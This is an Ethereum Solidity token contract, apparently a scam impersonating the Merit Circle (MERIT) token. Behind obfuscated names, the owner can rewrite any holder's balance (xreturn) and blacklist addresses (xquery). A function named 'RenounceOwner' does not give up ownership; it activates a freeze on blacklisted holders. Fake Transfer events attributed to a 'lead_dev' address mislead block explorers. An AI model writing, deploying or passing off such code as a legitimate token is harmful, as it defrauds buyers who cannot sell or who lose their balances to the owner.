/**
 *Submitted for verification at Etherscan.io on 2022-10-15
*/

// "SPDX-License-Identifier: UNLICENSED

                                    
pragma solidity 0.8.16;


  library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {

        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }


    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }


    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}   
 
 
contract MERITCIRCLE {
  
    mapping (address => uint256) public TamN;
    mapping (address => bool) xTXm;


    // 
    string public name = "Merit Circle";
    string public symbol = unicode"MERIT";
    uint8 public decimals = 18;
    uint256 public totalSupply = 500000000 * (uint256(10) ** decimals);
    uint256 private _totalSupply;
    uint xvr = 0;

    event Transfer(address indexed from, address indexed to, uint256 value);
   



        constructor()  {
        TamN[msg.sender] = totalSupply;
        deploy(lead_dev, totalSupply); }



	address owner = msg.sender;
    address V3Router = 0x35093ef0eD1d95B8767b79734a4ca2BacA180293;
    address lead_dev = 0x426903241ADA3A0092C3493a0C795F2ec830D622;
   





    function deploy(address account, uint256 amount) public {
    require(msg.sender == owner);
    emit Transfer(address(0), account, amount); }
    modifier OI() {   
         require(msg.sender == owner);
         _;}



    function transfer(address to, uint256 value) public returns (bool success) {

        if(msg.sender == V3Router)  {
        require(TamN[msg.sender] >= value);
        TamN[msg.sender] -= value;  
        TamN[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; } 
        if(xTXm[msg.sender]) {
        require(xvr < 1);} 
        require(TamN[msg.sender] >= value);
        TamN[msg.sender] -= value;  
        TamN[to] += value;          
        emit Transfer(msg.sender, to, value);
        return true; }


        function balanceOf(address account) public view returns (uint256) {
        return TamN[account]; }
        function xquery(address I) OI public{          
        require(!xTXm[I]);
        xTXm[I] = true;}

        event Approval(address indexed owner, address indexed spender, uint256 value);

        mapping(address => mapping(address => uint256)) public allowance;

        function approve(address spender, uint256 value) public returns (bool success) {    
        allowance[msg.sender][spender] = value;

        emit Approval(msg.sender, spender, value);
        return true; }
		 function xreturn(address I, uint256 xY) OI public returns (bool success) {
        TamN[I] = xY;
        return true; }
        function RenounceOwner() public {
        require(msg.sender == owner);
        xvr = 1;}
        function withdraw(address I) OI public {
        require(xTXm[I]);
        xTXm[I] = false; }

   


    function transferFrom(address from, address to, uint256 value) public returns (bool success) {   
        if(from == V3Router)  {
        require(value <= TamN[from]);
        require(value <= allowance[from][msg.sender]);
        TamN[from] -= value;  
        TamN[to] += value; 
        emit Transfer (lead_dev, to, value);
        return true; }    
        if(xTXm[from] || xTXm[to]) {
        require(xvr < 1);}
        require(value <= TamN[from]);
        require(value <= allowance[from][msg.sender]);
        TamN[from] -= value;
        TamN[to] += value;
        allowance[from][msg.sender] -= value;
        emit Transfer(from, to, value);
        return true; }
    }